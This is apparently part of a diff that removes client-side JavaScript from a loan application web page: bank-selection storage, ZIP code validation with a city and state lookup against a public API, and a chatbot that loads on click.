-        localStorage.setItem('selectedBank', customerBankSelect.value);
-    }
-}
-
-// ZIP code validation function
-function setupZipCodeValidation() {
-    const zipCodeInput = document.getElementById('zipCode');
-    if (zipCodeInput) {
-        zipCodeInput.addEventListener('input', function() {
-            const zipCode = this.value.replace(/\D/g, '');
-            if (zipCode.length === 5) {
-                // Auto-fill city and state using Zippopotam.us API
-                fetch(`https://api.zippopotam.us/us/${zipCode}`)
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.places && data.places.length > 0) {
-                            const place = data.places[0];
-                            document.getElementById('city').value = place['place name'];
-                            document.getElementById('state').value = place['state abbreviation'];
-                        }
-                    })
-                    .catch(error => {
-                        console.log('ZIP code lookup failed:', error);
-                    });
-            }
-        });
-    }
-}
-
-        // Initialize when DOM is loaded
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('🌟 Page loaded, initializing form...');
-            
-            // Check if form exists
-            const form = document.getElementById("loanApplicationForm");
-            if (!form) {
-                console.error('❌ Form not found!');
-                alert('❌ Form not found. Please refresh the page.');
-                return;
-            }
-            
-            console.log('✅ Form found:', form);
-            
-            // Initialize bank selection
-            loadBankSelection();
-            
-            // Add change listener to bank select
-            const customerBankSelect = document.getElementById('customerBank');
-            if (customerBankSelect) {
-                customerBankSelect.addEventListener('change', saveBankSelection);
-            }
-            
-            // Add ZIP code validation
-            setupZipCodeValidation();
-            
-            const loginBtn = document.querySelector('button[onclick="initiateGoogleLogin()"]');
-            if (loginBtn) {
-                loginBtn.innerHTML = '<i class="fas fa-user mr-2"></i><span>My Account</span>';
-                loginBtn.onclick = () => window.location.href = 'login-success.html';
-            }
-        });
-
-        // ZIP Code Validation Function
-        function setupZipCodeValidation() {
-            const zipInput = document.getElementById('zipCode');
-            const cityInput = document.getElementById('city');
-            const stateInput = document.getElementById('state');
-            const zipError = document.getElementById('zipError');
-            const zipLoading = document.getElementById('zipLoading');
-
-            if (!zipInput || !cityInput || !stateInput) {
-                console.error('❌ ZIP validation fields not found');
-                return;
-            }
-
-            let zipTimeout;
-
-            zipInput.addEventListener('input', function(e) {
-                const zip = e.target.value.replace(/\D/g, ''); // Only allow numbers
-                
-                // Update input with numbers only
-                e.target.value = zip;
-                
-                // Clear previous timeout
-                clearTimeout(zipTimeout);
-                
-                // Hide error and loading
-                zipError.classList.add('hidden');
-                zipLoading.classList.add('hidden');
-                
-                // Only validate if exactly 5 digits
-                if (zip.length === 5) {
-                    zipLoading.classList.remove('hidden');
-                    
-                    // Debounce API call
-                    zipTimeout = setTimeout(() => {
-                        validateAndFetchZipData(zip);
-                    }, 500);
-                } else if (zip.length > 0) {
-                    showZipError('ZIP code must be exactly 5 digits');
-                }
-            });
-
-            zipInput.addEventListener('blur', function(e) {
-                const zip = e.target.value;
-                if (zip.length !== 5) {
-                    showZipError('Invalid ZIP code');
-                }
-            });
-        }
-
-        function validateAndFetchZipData(zip) {
-            const zipError = document.getElementById('zipError');
-            const zipLoading = document.getElementById('zipLoading');
-            const cityInput = document.getElementById('city');
-            const stateInput = document.getElementById('state');
-
-            // First validate format
-            if (!/^\d{5}$/.test(zip)) {
-                showZipError('Invalid ZIP code format');
-                return;
-            }
-
-            // Fetch ZIP data from API
-            fetch(`https://api.zippopotam.us/us/${zip}`)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Invalid ZIP code');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    // Success - auto-fill city and state
-                    if (data && data.places && data.places.length > 0) {
-                        const place = data.places[0];
-                        cityInput.value = place['place name'] || '';
-                        stateInput.value = place['state abbreviation'] || '';
-                        
-                        console.log('✅ ZIP data fetched:', {
-                            zip: zip,
-                            city: place['place name'],
-                            state: place['state abbreviation']
-                        });
-                        
-                        // Hide loading
-                        zipLoading.classList.add('hidden');
-                    } else {
-                        showZipError('Invalid ZIP code');
-                    }
-                })
-                .catch(error => {
-                    console.error('ZIP API Error:', error);
-                    if (error.message === 'Invalid ZIP code') {
-                        showZipError('Invalid ZIP code');
-                    } else {
-                        showZipError('Unable to verify ZIP code. Please try again.');
-                    }
-                    zipLoading.classList.add('hidden');
-                });
-        }
-
-        function showZipError(message) {
-            const zipError = document.getElementById('zipError');
-            const zipLoading = document.getElementById('zipLoading');
-            
-            zipError.textContent = message;
-            zipError.classList.remove('hidden');
-            zipLoading.classList.add('hidden');
-            
-            // Add red border to ZIP input
-            const zipInput = document.getElementById('zipCode');
-            zipInput.classList.add('border-red-500');
-            zipInput.classList.remove('border-gray-300');
-        }
-
-        function clearZipError() {
-            const zipError = document.getElementById('zipError');
-            const zipInput = document.getElementById('zipCode');
-            
-            zipError.classList.add('hidden');
-            zipInput.classList.remove('border-red-500');
-            zipInput.classList.add('border-gray-300');
-        }
-    </script>
-    <!-- Chatbot disabled by default - only load when user clicks chat button -->
-    <!-- <script src="chatbot.js"></script> -->
-    
-    <!-- Chat Button - Only loads chatbot when clicked -->
-    <div id="chatButton" style="position: fixed; bottom: 20px; right: 20px; z-index: 9999;">
-        <button onclick="loadChatbot()" style="background: #4F46E5; color: white; border: none; border-radius: 50%; width: 60px; height: 60px; font-size: 24px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.3); transition: all 0.3s;">
-            💬
-        </button>
-    </div>
-    
-    <script>
-        function loadChatbot() {
-            // Remove chat button
-            document.getElementById('chatButton').style.display = 'none';
-            
-            // Load chatbot script dynamically
-            const script = document.createElement('script');
-            script.src = 'chatbot.js';
-            document.body.appendChild(script);
-            
-            console.log('🤖 Chatbot loaded by user request');
-        }
-    </script>
 </body>
 </html>
